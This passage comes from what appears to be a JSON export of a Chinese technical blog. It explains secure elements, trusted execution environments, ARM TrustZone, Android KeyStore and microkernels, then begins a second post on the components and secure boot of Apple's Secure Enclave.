alt=\"SE.png\"></p>\n<p>从产品形态上，SE可以分为三种：</p>\n<ul>\n<li>UICC：也称通用集成电路卡，就是电信运营商发布和使用的手机SIM卡</li>\n<li>Embedded SE：嵌入式SE，以一个独立芯片的形式集成在设备的主板上，例如iPhone手机上集成的NXP SN200系列芯片（带NFC功能）</li>\n<li>Micro SD：以SD存储卡的形式存在，通过插入SD卡槽集成到手机上，由独立的SE制造商制造和销售，由于安全和性能问题现已基本淘汰</li>\n</ul>\n<p>此外，银行系统的U盾也被认为是SE的一种形态，其核心就是一块智能卡芯片，但是集成了电子数字证书与签名秘钥等更多安全能力。<br>SE提供了非常可靠的安全等级，但保存在其中的数据和程序需要有更新机制，一般是通过TSM（Trusted Service Manager）来实现的。</p>\n<h2 id=\"二、TEE-可信执行环境\"><a href=\"#二、TEE-可信执行环境\" class=\"headerlink\" title=\"二、TEE - 可信执行环境\"></a>二、TEE - 可信执行环境</h2><p>随着智能终端的普及发展，越来越多的终端设备运行在复杂的开放环境之中，仅仅依赖Android等软件技术显然无法提供足够的安全强度，但基于Secure Element的安全技术在集成难度和成本上也存在困难，例如小额支付、版权保护、企业VPN等典型应用的安全保护强度并不高，为此迫切需要在安全性能和成本之间找到平衡点，开发一种“合适强度”的安全架构。<br><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/vs.png\" alt=\"vs.png\"></p>\n<p>2006年，OMTP工作组智能终端的安全率先提出了一种双系统解决方案：即在同一个智能终端下，除了多媒体操作系统外再提供一个隔离的安全操作系统，这一运行在隔离的硬件之上的隔离安全操作系统用来专门处理敏感信息以保证信息的安全。该方案即TEE的前身。</p>\n<p>2013年，Global Platform（GP）提出了可信执行环境（TEE，Trusted Execution Environment）的概念，即不需要独立的物理芯片，而是在通用CPU内核上扩展出的安全可执行模式。</p>\n<p>与REE (Rich Execution Environment)对应，TEE是与设备上的Rich OS（通常是Android等）并存的运行环境，通常具有其自身的执行空间，为Rich OS运行某些关键操作（指纹验证、PIN码输入、私钥存储、证书存储、数字版权保护等）提供安全服务，例如：</p>\n<p><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/TEE.png\" alt=\"TEE.png\"></p>\n<p>GP在TEE的标准化方面下足了工夫，定义了一系列技术规范：</p>\n<ul>\n<li>Internal API：负责为可信应用TA提供对安全资源和服务的访问，包括密钥注入和管理、加密、安全存储、安全时钟、可信用户界面（UI）和可信键盘等</li>\n<li>Client API：是让运行在Rich OS中的客户端应用（CA）访问TA服务和数据的底层通信接口</li>\n<li>Functional API：包括应用管理、调试功能、安全保护轮廓等</li>\n</ul>\n<p>TEE环境比Rich OS(普通操作系统)的安全级别更高，略差于安全元件SE，但成本显著降低，其核心特征是：</p>\n<ul>\n<li>TEE具有其自身的执行空间，也就是说在TEE的环境下有一个独立的操作系统，如seL4微内核</li>\n<li>TEE所能访问的硬件资源是与Rich OS分离的，拥有独立的MCU、DRAM、SRAM等</li>\n<li>TEE提供了授权安全软件(TrustApp可信应用，简称TA)的安全执行环境，同时也保护TA的资源和数据的保密性、完整性和访问权限。为了保证TEE本身的可信根，TEE在安全启动过程中是要通过验证并且与Rich OS隔离的</li>\n<li>在TEE中，每个TA是相互独立的，而且不能在未授权的情况下互相访问。简而言之就是在TEE环境的操作系统上同样有相应的应用程序(TA)，除了TEE的运行环境与普通操作系统相互独立外，TEE里的每一个TA也是需要授权并相互独立运行的。</li>\n</ul>\n<h2 id=\"三、ARM-TrustZone\"><a href=\"#三、ARM-TrustZone\" class=\"headerlink\" title=\"三、ARM TrustZone\"></a>三、ARM TrustZone</h2><p>TEE是一种基于通用CPU内核的嵌入式硬件技术，因此不同CPU指令集上必然有着相应的技术实现，包括：</p>\n<ul>\n<li>AMD PSP（Platform Security Processor）处理器</li>\n<li>ARM TrustZone技术（支持TrustZone的所有ARM处理器）</li>\n<li>Intel x86-64指令集：SGX Software Guard Extensions</li>\n<li>MIPS：虚拟化技术Virtualization</li>\n</ul>\n<p>ARM架构的处理器是智能终端市场的绝对霸主，也是TEE技术的主导者之一。2006年，ARM提出了硬件虚拟化技术<strong>TrustZone</strong>，通过引入安全扩展成为所有Cortex-A 类处理器的基本功能，随后ARM将其 TrustZone API 提供给 GlobalPlatform，也就是 TEE 的 Client API。</p>\n<p><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/el3-aarch64.png\" alt=\"el3-aarch64.png\"><br>TrustZone-A引入了安全世界（secure world）和非安全世界（none secure world）的概念，并且能够通过读取SCR（Secure Configuration Register）寄存器的第33位NS（None Secure）比特位进行判断。并且该值可用于外设总线（即通过NS比特位判断哪些设备是安全设备，只能在安全世界进行访问，在硬件层面对外设寄存器的访问进行了限制），以及管控对内存区域的访问（哪片地址空间只能够在安全世界访问，而非安全世界无权访问）。</p>\n<p>此外，Cortex-A为CPU引入了新的Monitor Mode模式。Monitor模式是作为安全世界和非安全世界间沟通的存在，无论是从安全世界退出到非安全世界，还是从非安全世界进入安全世界都要经过Monitor模式。从官方的介绍可知，从非安全世界和安全世界进入Monitor Mode有两种方式，一种是通过SMC（Secure Monitor Call）指令，另一种方式是通过在安全世界注册的中断。</p>\n<pre><code>从成本的角度出发，大多数支持TrustZone的CPU芯片采用虚拟化的方案，即将全部或某些物理核虚拟为一个非安全核和一个安全核，以基于时间片的方式轮流占用物理核，并通过Monitor Mode在安全世界和非安全世界之间切换。当然，如果不差钱也可以指定若干内核专门运行安全世界，也就是协处理器的方案\n</code></pre>\n<p>总结一下，ARM Trustzone不具体指一个硬件或软件，而是一个技术架构，在支持ARM Trustzone的SOC中，需按照ARM Trustzone技术对各个子模块进行设计。下图就是一个支持Trustzone架构的SOC设计框图。</p>\n<p><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/soc.png\" alt=\"soc.png\"></p>\n<p>需要指出的是，由于Apple、华为、高通等公司的自研CPU芯片都是基于ARM授权，由此Apple的Secure Enclave、高通的QSE等技术就是TrustZone的变种。<br>例如，华为鲲鹏服务器推出的TrustZone套件，就是一个以ARM TrustZone为技术实现基础，由硬件(包括BIOS、BMC)、机密计算运行环境，以及配套的 patch、应用开发指导和应用打包工具等组成的端到端的解决方案。<br><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/kunpeng.png\" alt=\"kunpeng.png\"></p>\n<hr>\n<h2 id=\"附录一：Android设备的指纹识别\"><a href=\"#附录一：Android设备的指纹识别\" class=\"headerlink\" title=\"附录一：Android设备的指纹识别\"></a>附录一：Android设备的指纹识别</h2><p>Android设备的指纹识别，依赖TEE来实现用户指纹认证，要求指纹采集、注册和识别都必须在TEE内部进行，已保证安全。</p>\n<p>Android从4.0开始引入了KeyStore，开发者可以使用KeyStore API生成密钥、使用密钥签名、使用密钥加解密、获取密钥的属性信息，但无法将密钥本身从KeyStore中取出。因为密钥不进入应用进程，这大大提高了密钥的安全性。随着Android版本更迭，KeyStore的实现不断进化得更加安全，在有些设备上，不仅密钥不进入应用进程，甚至不进入Android OS只存储在TEE或SE中，接下来我们大概列举下KeyStore的进化。</p>\n<ul>\n<li>4.0：创世版本，密钥使用用户的passcde加密后存储，支持RSA、ECDSA</li>\n<li>4.1：增加了使用安全硬件的基础设施，在可能的情况下密钥会被存储到安全硬件中</li>\n<li>6.0：增加支持AES、HMAC；增加了密钥绑定用户认证的能力，即可以指定某些密钥，在每一次使用时，必须由用户进行认证（指纹、passcode等）</li>\n<li>7.0：强制要求预装7.0系统的设备必须拥有安全硬件并且支持基于安全硬件的KeyStore</li>\n<li>8.0：增加了设备证明（Key Attestation）能力，开发者可通过验证Key Attestation的证书链，来确认密钥的确保存在了安全硬件中</li>\n</ul>\n<p><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/finger.png\" alt=\"finger.png\"></p>\n<h2 id=\"附录二：微内核\"><a href=\"#附录二：微内核\" class=\"headerlink\" title=\"附录二：微内核\"></a>附录二：微内核</h2><p>与微内核对应的是宏内核，典型产品就是Linux。</p>\n<p>宏内核被视作为运行在单一地址空间的单一的进程，内核提供的所有服务，都以特权模式，在这个大型的内核地址空间中运作，这个地址空间被称为内核态（kernel space）。<br>宏内核通常以单一静态二进制文件的方式被存储在磁盘，或是缓冲存储器上，在引导之后被加载存储器中的内核态，开始运作。<br>宏内核的优点是设计简单。在内核之中的通信成本很小，内核可以直接调用内核态内的函数，跟用户态的应用程序调用函数一样，因此它的性能很好。在1980年代之前，所有的操作系统都采用这个方式实现；即使到了现在，主要的操作系统也多采用这个方式。</p>\n<p>与之相对，微内核的支持者认为，宏内核的移植性不佳，操作系统的代码高度耦合，很难适配不同的CPU架构，此外，所有的模块也都在同一块寻址空间内执行，倘若某个模块有错误，执行时就会损及整个操作系统运作。<br>微内核的设计理念，是将系统服务的实现，与系统的基本操作规则区分开来。它实现的方式，是将核心功能模块化，划分成几个独立的进程，各自运行，这些进程被称为服务（service）。所有的服务进程，都运行在不同的地址空间。只有需要绝对特权的进程，才能在具特权的执行模式下运行，其余的进程则在用户空间运行。</p>\n<p>第一代微内核，在内核提供了较多的服务，因此被称为“胖微内核”，它的典型代表是Mach，它既是GNU HURD也是Mac OS X的内核。<br>第二代微内核只提供最基本的OS服务，典型的OS是QNX，QNX在黑莓手机BlackBerry 10系统中被采用。L4微内核系列也是著名的微核心</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">微内核OS</th>\n<th align=\"center\">通信机制</th>\n<th align=\"center\">性能</th>\n<th align=\"center\">安全性</th>\n<th align=\"center\">可靠性</th>\n<th align=\"center\">可拓展性</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Mach</td>\n<td align=\"center\">共享内存，同步</td>\n<td align=\"center\">☆☆</td>\n<td align=\"center\">×</td>\n<td align=\"center\">☆☆</td>\n<td align=\"center\">☆</td>\n</tr>\n<tr>\n<td align=\"center\">L4</td>\n<td align=\"center\">共享内存，异步</td>\n<td align=\"center\">☆☆☆</td>\n<td align=\"center\">×</td>\n<td align=\"center\">☆☆</td>\n<td align=\"center\">☆☆</td>\n</tr>\n<tr>\n<td align=\"center\">seL4</td>\n<td align=\"center\">同步和异步端点</td>\n<td align=\"center\">☆☆☆☆</td>\n<td align=\"center\">√</td>\n<td align=\"center\">☆☆☆</td>\n<td align=\"center\">☆☆☆</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.cnblogs.com/blogernice/articles/14942270.html\">ARM TrustZone的深度解析</a></li>\n<li><a href=\"https://aijishu.com/a/1060000000320633\">ARM Trustzone的安全扩展资料大全</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/471110552\">从可信计算到机密计算 - 冯登国</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/34813040\">网银U盾安全认证原理解析</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/384966998\">隐私计算技术之可信执行环境（TEE）</a></li>\n<li><a href=\"https://hack-big.tech/2021/01/23/Microcontroller-TrustZone%E9%9A%94%E7%A6%BB%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/\">TrustZone-M简介</a></li>\n<li><a href=\"https://www.laoyaoba.com/html/share/news?source=pc&news_id=583957\">从TrustZone建置安全验证硬件基础 - FIDO联盟</a></li>\n<li><a href=\"https://www.cnblogs.com/hjbf/p/13298964.html\">ARM cortex三个版本A，R, M之间区别</a></li>\n<li><a href=\"https://blog.csdn.net/xiasli123/article/details/105191368\">微内核发展史与Mach、L4、seL4微内核OS的比较</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"%E5%88%9B%E6%96%B0%E5%8F%91%E5%B1%95%E4%B8%AD%E7%9A%84%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA%E4%B8%8E%E6%8A%80%E6%9C%AF-%E5%86%AF%E7%99%BB%E5%9B%BD.pdf\">创新发展中的可信计算理论与技术 - 冯登国</a></li>\n<li><a href=\"%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%9A%94%E7%A6%BB%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6%E7%BB%BC%E8%BF%B0.pdf\">系统安全隔离技术研究综述 - 郑显义</a></li>\n<li><a href=\"https://res-www.zte.com.cn/mediares/magazine/publication/com_cn/article/201505/445481/P020151028370420765032.pdf\">安全可信智能移动终端研究 - 张大伟</a></li>\n<li><a href=\"https://www.trustkernel.com/uploads/pubs/TEE-%E4%BB%8E%E6%89%8B%E6%9C%BA%E7%AB%AF%E5%88%B0%E4%BA%91%E7%AB%AF%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%A2%9E%E5%BC%BA.pdf\">TEE：从手机端到云端的系统安全增强</a></li>\n<li><a href=\"https://support.huaweicloud.com/twp-kunpengcctrustzone/twp-kunpengcctrustzone.pdf\">鲲鹏 BoostKit 机密计算 TrustZone 套件 技术白皮书</a></li>\n<li><a href=\"%E4%BD%BF%E7%94%A8NXP_%E5%AE%89%E5%85%A8MCU_LPC54S0xx_%E6%9E%84%E5%BB%BA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F.pdf\">使用NXP 安全MCU LPC54S0xx 构建安全系统</a></li>\n<li><a href=\"seL4-whitepaper.pdf\">SEL4技术白皮书-英文版</a></li>\n<li><a href=\"RISC-V%E8%8A%AF%E7%89%87%E7%9A%84%E5%8A%A0%E5%AF%86%E5%8D%8F%E5%A4%84%E7%90%86%E5%99%A8%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%A1%88.pdf\">RISC-V芯片的加密协处理器设计方案</a></li>\n</ul>\n"},{"title":"Apple安全隔区（Secure Encalve）技术概览","url":"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/","content":"<h2 id=\"一、Apple平台安全性-软件-硬件-服务\"><a href=\"#一、Apple平台安全性-软件-硬件-服务\" class=\"headerlink\" title=\"一、Apple平台安全性 &#x3D; 软件 + 硬件 + 服务\"></a>一、Apple平台安全性 &#x3D; 软件 + 硬件 + 服务</h2><p><a href=\"apple%E5%B9%B3%E5%8F%B0%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-2021%E4%B8%AD%E6%96%87%E7%89%88.pdf\">apple平台安全白皮书</a>指出，Apple平台安全性的核心理念是：强调硬件、软件和服务的紧密联系和共同协作，为智能终端（iOS）、台式设备（MacOS）、可穿戴设备（WatchOS）和家居设备等不同类型设备提供具备独特性的安全性架构，目标是在为用户提供最高的安全性和透明的使用体验，其中：</p>\n<ul>\n<li>硬件：遵循“<strong>支持有限且单独定义的功能</strong>”的准则，依托Apple自行设计的芯片和安全性硬件，为关键的安全性功能提供支持，以使攻击面最小化</li>\n<li>软件：通过软件保护为操作系统和第三方App提供了安全保障</li>\n<li>服务：通过服务提供安全且及时的软件更新机制，帮助建立受保护的App生态系统，并保障通信和支付的安全</li>\n</ul>\n<p><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/framework.png\" alt=\"技术架构\"></p>\n<p>需要注意的是，Apple安全体系中有三个最核心的密钥，分别是：</p>\n<ul>\n<li>UID：一个 256 位的 AES 密钥，在设备制造过程中刻录在每个处理器上。这种密钥无法由固件或软件读取，只能由处理器的硬件 AES 引擎使用。UID 与设备上的任何其他标识符均无关，包括但不限于 UDID</li>\n<li>GID：设备组ID，类似于 UID，但同一类中的每个处理器的 GID 都相同</li>\n<li>用户密码：iOS中称为passcode，MacOS中称为password，由用户自行设置,一般是4位数字、6位数字或无限长度的字母组合</li>\n</ul>\n<h2 id=\"二、Secure-Enclave的发展历程\"><a href=\"#二、Secure-Enclave的发展历程\" class=\"headerlink\" title=\"二、Secure Enclave的发展历程\"></a>二、Secure Enclave的发展历程</h2><p>对苹果来说，自研芯片已经成为了一种寻求产品差异化的手段，这不仅在 iPhone 上有所体现，你在 Mac 电脑、Apple Watch 手表和 AirPods 耳机中都能找到苹果芯片的身影。</p>\n<h3 id=\"1-A系列主处理器（iOS）\"><a href=\"#1-A系列主处理器（iOS）\" class=\"headerlink\" title=\"1. A系列主处理器（iOS）\"></a>1. A系列主处理器（iOS）</h3><p>2013年，Apple发布了iPhone 5S，首次支持了指纹识别设备Touch ID，为此需要解决一个关键问题，如何安全地存储生物特征数据？显而易见的是，单纯的软件方案或云端方案肯定无法获得消费者和监管机构的安全认可。<br>iPhone 5S的 CPU 是基于 ARMv8 架构的<strong>A7</strong>自研芯片，为了实现本地级别的加密和安全，其设计了一个专门的协处理器用于实现本地级别的加密和安全，这就是安全隔区Secure Enclave。<br><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/apple-A.jpeg\" alt=\"A\"></p>\n<h3 id=\"2-M-T-系列主处理器（MacOS）\"><a href=\"#2-M-T-系列主处理器（MacOS）\" class=\"headerlink\" title=\"2. M(T)系列主处理器（MacOS）\"></a>2. M(T)系列主处理器（MacOS）</h3><p>传统上，Mac个人电脑是基于Intel的芯片，因此在硬件安全性上受到严重的制约，为此Apple只能通过引入额外的 T2 芯片来支撑安全特性。</p>\n<p>2016年，苹果开始为新 MacBook 加入名为<strong>T1</strong>的自研芯片，当时主要是为了驱动 TouchBar 触控条的运行，同时也负责指纹识别的安全管理。<br>2017年，苹果在发布 iMac Pro时，发布了升级版的 T2 芯片.<br><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/t2.png\" alt=\"T2\"></p>\n<p>2020年，Apple发布了首款专为MacOS打造的M1芯片，将中央处理器、输入输出、安全隔区等功能统统整合在同一块芯片，为全面淘汰Intel CPU做好了准备，也表明T系列安全芯片即将终结。</p>\n<h3 id=\"3-S系列主处理器（WatchOS）\"><a href=\"#3-S系列主处理器（WatchOS）\" class=\"headerlink\" title=\"3. S系列主处理器（WatchOS）\"></a>3. S系列主处理器（WatchOS）</h3><p>2015年，Apple发布了Apple Watch，采用自研的S1芯片，运行watchOS操作系统，目前已经发展到 S8 和 WatchOS 9.0。<br>S系列处理器同样包含安全隔区，为生物特征数据的采集和存储提供安全解决方案。<br>此外，Apple TV HD 、HomePod 和 HomePod mini等各类Apple产品都搭载安全隔区。</p>\n<p>总结一下，通过Secure Enclave技术，Apple实现了智能终端、生产力设备和可穿戴设备等各个平台的统一安全解决方案，将硬件和软件的整合提升到了一个全新的高度。</p>\n<h2 id=\"三、Secure-Enclave的核心组件\"><a href=\"#三、Secure-Enclave的核心组件\" class=\"headerlink\" title=\"三、Secure Enclave的核心组件\"></a>三、Secure Enclave的核心组件</h2><p>安全隔区是一个独立于操作系统的片上系统（System on Chips），自身拥有独立的Boot ROM和AES引擎，为数据保护密钥管理提供所有加密操作，并保持数据保护的完整性（即使内核已被破坏）。<br>安全隔区还为加密静态数据所需密钥的安全生成和储存提供了基础，通过特殊通道向 AES 引擎提供所需的密钥材料，而不将此信息透露给应用程序处理器 (或 CPU) 或者整个操作系统。<br>一般认为，Secure Enclave就是一个高度定制版的 ARM TrustZone，也就是“安全世界”的物理实现。<br><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/soc.png\" alt=\"SOC\"></p>\n<h3 id=\"1、安全隔区处理器（Secure-Enclage-Processor，SEP）\"><a href=\"#1、安全隔区处理器（Secure-Enclage-Processor，SEP）\" class=\"headerlink\" title=\"1、安全隔区处理器（Secure Enclage Processor，SEP）\"></a>1、安全隔区处理器（Secure Enclage Processor，SEP）</h3><ul>\n<li>安全隔区处理器为安全隔区提供专用计算能力</li>\n<li>运行Apple定制的L4微内核（也称为sepOS），包含了Apple的签名证书</li>\n</ul>\n<h3 id=\"2、内存保护引擎（Memory-Protection-Engine）\"><a href=\"#2、内存保护引擎（Memory-Protection-Engine）\" class=\"headerlink\" title=\"2、内存保护引擎（Memory Protection Engine）\"></a>2、内存保护引擎（Memory Protection Engine）</h3><ul>\n<li>安全隔区使用宿主设备的内存硬件资源，但规划了专用区域，通过多层保护将由安全隔区保护的内存与应用程序处理器隔离</li>\n<li>当设备启动时，安全隔区 Boot ROM 将生成一组随机临时密钥，用于内存保护引擎的加密处理和认证处理，并支持安全隔区内存的重放保护</li>\n<li>内存保护引擎以内联方式运行且对安全隔区透明，即：安全隔区将内存当作普通的未加密内存一样进行读取和写入，而安全隔区外的观察程序只能看到加密和认证版本的内存</li>\n<li>在 A14 和 M1 之后增加了第二组密钥，用于与安全神经网络引擎共享的数据</li>\n</ul>\n<h3 id=\"3、真随机数生成器（True-Random-Number-Generator，TRNG）\"><a href=\"#3、真随机数生成器（True-Random-Number-Generator，TRNG）\" class=\"headerlink\" title=\"3、真随机数生成器（True Random Number Generator，TRNG）\"></a>3、真随机数生成器（True Random Number Generator，TRNG）</h3><ul>\n<li>用于生成安全的随机数，每次生成随机加密密钥、随机密钥种子或其他熵源时都会使用TRNG</li>\n<li>基于多个并联环形振荡器的异或计算产生真随机数，再通过CTR_DRBG后处理算法提供安全的随机数</li>\n</ul>\n<h3 id=\"4、安全隔区AES引擎（Secure-Enclage-AES-Engine）\"><a href=\"#4、安全隔区AES引擎（Secure-Enclage-AES-Engine）\" class=\"headerlink\" title=\"4、安全隔区AES引擎（Secure Enclage AES Engine）\"></a>4、安全隔区AES引擎（Secure Enclage AES Engine）</h3><ul>\n<li>安全隔区AES引擎是一个硬件块，用于基于 AES 密码来执行对称加密</li>\n<li>AES 引擎设计用于防范通过时序和静态功耗分析 (SPA) 泄露信息，还包括动态功耗分析 (DPA) 对策</li>\n<li>AES引擎支持软件密钥和硬件密钥，其内部保存了基于UID派生的硬件密钥，虽然sepOS可以请求通过硬件密钥进行加密和解密操作，但不能提取密匙</li>\n</ul>\n<h3 id=\"5、公钥加速器（Public-Key-Accelerator，PKA）\"><a href=\"#5、公钥加速器（Public-Key-Accelerator，PKA）\" class=\"headerlink\" title=\"5、公钥加速器（Public Key Accelerator，PKA）\"></a>5、公钥加速器（Public Key Accelerator，PKA）</h3><ul>\n<li>公钥加速器 (PKA) 是一个用于执行非对称加密操作的硬件块，支持 RSA 和 ECC (椭圆曲线加密) 签名和加密算法</li>\n<li>PKA 设计用于防范使用时序攻击及静态功耗分析（SPA）和动态功耗分析（DPA）等旁路攻击来泄露信息。</li>\n<li>PKA 支持软件密钥和硬件密钥，其内部保存了基于UID派生的硬件密钥，即使对sepOS软件也不可见</li>\n<li>在Apple A10之后，PKA还支持操作系统绑定密钥，也称为密封密钥保护 (SKP)，其基于安全隔区Boot ROM的哈希值 + 设备UID的组合生成，由安全隔区启动监视器负责在请求特定 Apple 服务时验证 sepOS 版本，目的是在系统发生重大版本更改时，防止未授权用户的访问</li>\n</ul>\n<h2 id=\"四、Secure-Enclave的附加组件\"><a href=\"#四、Secure-Enclave的附加组件\" class=\"headerlink\" title=\"四、Secure Enclave的附加组件\"></a>四、Secure Enclave的附加组件</h2><p>上述5个核心组件均属于计算资源范畴，与 ARM TrustZone 通用架构基本一致，但Apple安全隔区还有一些特殊类型的组件。</p>\n<h3 id=\"1-安全隔区启动代码（Secure-Enclave-Boot-ROM）\"><a href=\"#1-安全隔区启动代码（Secure-Enclave-Boot-ROM）\" class=\"headerlink\" title=\"1. 安全隔区启动代码（Secure Enclave Boot ROM）\"></a>1. 安全隔区启动代码（Secure Enclave Boot ROM）</h3><p>Apple 安全启动的设计目的是：仅允许来自 Apple 的受信任操作系统软件在启动时加载，并确保可保护软件的最底层不被篡改。<br>Boot ROM 是处理器在首次启动时所执行的第一个代码，一般固化在硬件中作为处理器不可分割的一部分，即使Apple也无法修改。<br><img src=\"/2022/10/03/Apple%E5%AE%89%E5%85%A8%E9%9A%94%E5%8C%BA%EF%BC%88Secure-Encalve%EF%BC%89%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/bootrom.png\" alt=\"boot rom\"></p>\n<p>与主CPU的 Boot ROM 类似，安全隔区也包括一个专用的安全隔区 Boot ROM，是一段不可更改的代码，作为安全隔区的硬件信任根。<br>安全隔区启动的基本步骤包括：</p>\n<ol>\n<li>系统启动时，iBoot 会给安全隔区分配一个专用的内存区域；</li>\n<li>安全隔区 Boot ROM 作为安全隔区的硬件信任根，其首先初始化内存保护引擎，为由安全隔区保护的内存提供加密保护;</li>\n<li>应用程序处理器将 sepOS 镜像发送给安全隔区 Boot ROM，并拷贝到由安全隔区保护的内存；</li>\n<li>安全隔区 Boot ROM 检查 sepOS 映像的加密哈希值和签名，如果已正确签名以在设备上运行，将控制转移给 sepOS；否则，阻止进一步使用安全隔区直到下一次芯片被还原。</li>\n<li>在 A10 之后，安全隔区 Boot ROM 还将 sepOS 的哈希值锁定到专用寄存器，以便公钥加速器PKA用于操作系统绑定功能。</li>\n</ol>\n<h3 id=\"2-安全隔区启动监视器（Secure-Enclave-Boot-Monitor）\"><a href=\"#2-安全隔区启动监视器（Secure-Enclave-Boot-Monitor）\" class=\"headerlink\" title=\"2. 安全隔区启动监视器（Secure Enclave Boot Monitor）\"></a>2. 安全隔区启动监视器（Secure Enclave Boot Monitor）</h3><ul>\n<li>在 A13 之后，安全隔区还包括一个启动监视器，目标是阻止安全隔区处理器执行安全隔区 Boot ROM 以外的任何其他代码，以确保所启动 sepOS 的的完整性</li>\n<li>启动监视器依赖安全隔区处理器的系统协处理器完整性保护 (SCIP) 配置实现保护功能</li>\n<li>安全隔区 Boot ROM 启动时，通过检测 SepOS 镜像的哈希值以确保合法授权，而启动监视器负责确定并监控 sepOS 加载后的运行哈希值，以确保运行过程中代码不被外部篡改</li>\n</ul>\n<h3 id=\"3-根加密密钥（Root-Cryptographic-Keys）\"><a href=\"#3-根加密密钥（Root-Cryptographic-Keys）\" class=\"headerlink\" title=\"3. 根加密密钥（Root Cryptographic Keys）\"></a>3. 根加密密钥（Root Cryptographic Keys）</h3><ul>\n<li>安全隔区包括一个唯一 ID (UID) 根加密密钥。UID 对于每台设备来说都是唯一的，且与设备上的任何其他标 识符都无关</li>\n<li>UID 是在制造过程中由安全隔区 TRNG 生成的随机数，并使用完全在安全隔区中运行的软件进程写入到<strong>熔丝</strong>中，Apple 或其任何供应商均无法访问或储存</li>\n<li>sepOS 使用 UID 作为加密因子生成各类密钥，从而将数据与特定设备捆绑起来。 例如，由于文件系统密钥层级中包括 UID， 因此如果将内置SSD储存设备从一台设备整个移至另一台设备，文件将不可访问，但通过USB连接的外部存储设备由于没有连接到AES 引擎，所以无法实现迁移保护；触控 ID 或面容 ID 数据的密钥也在受保护的范围内</li>\n<li>安全隔区还有设备组 ID (GID)，它是使用特定 SoC 的所有设备共用的 ID (例如，所有使用 Apple A14 SoC 的设备共用同一个 GID)</li>\n<li>UID 和 GID 不可以通过联合测试行动小组 (JTAG) 或其他调试接口使用</li>\n</ul>\n<blockquote>\n<p>熔丝，一般称为E-Fuse或OTP Fuse，本质就是内嵌的一块One Time Programmable Memory, 仅可被烧写一次，但可以被多次读取。</p>\n</blockquote>\n<h3 id=\"4、安全非易失性存储（Secure-Nonvolatile-Storage）\"><a href=\"#4、安全非易失性存储（Secure-Nonvolatile-Storage）\" class=\"headerlink\" title=\"4、安全非易失性存储（Secure Nonvolatile Storage）\"></a>4、安全非易失性存储（Secure Nonvolatile Storage）</h3><ul>\n<li>安全隔区配备了<strong>专用</strong>的安全非易失性存储器设备（区别于应用处理器的 NAND 存储设备），通过专用的 I2C 总线与安全隔区连接，确保物理层面仅可被安全隔区访问</li>\n<li>早期使用 EEPROM 作为数据存储资源，从 A12、S4 开始采用了第一代安全存储组件，它与安全隔区之间使用加密且认证的通信协议，确保对数据资源的独有访问权限</li>\n<li>2020年10月，发布了第二代安全组件，主要特性是新增了计数器加密箱，用于保护简单而易受攻击的用户密码passcode</li>\n<li>安全储存组件设计用于以下关键业务场景的数据保护，包括：不可更改的 ROM 代码、硬件随机数生成器、每个设备唯一的加密密钥、加密引擎和物理篡改检测等</li>\n</ul>\n<blockquote>\n<p>虽然Apple官方文档没有描述，但本人认为，安全存储组件可能存储的数据包括：</p>\n<ul>\n<li>生成密钥：通过UID、passcode和随机数等加密因子生成的各类密钥，需要持久化保存在安全载体之中</li>\n<li>生物特征：指纹识别和人脸识别的特征数据必须且只能保存在本机设备的安全载体之中</li>\n<li>各类计数器：保存状态数据，阻断重放攻击等反复尝试</li>\n</ul>\n</blockquote>\n<h3 id=\"5-AES引擎（AES-Engine）\"><a href=\"#5-AES引擎（AES-Engine）\" class=\"headerlink\" title=\"5. AES引擎（AES Engine）\"></a>5. AES引擎（AES Engine）</h3><ul>\n<li>在安全隔区 AES 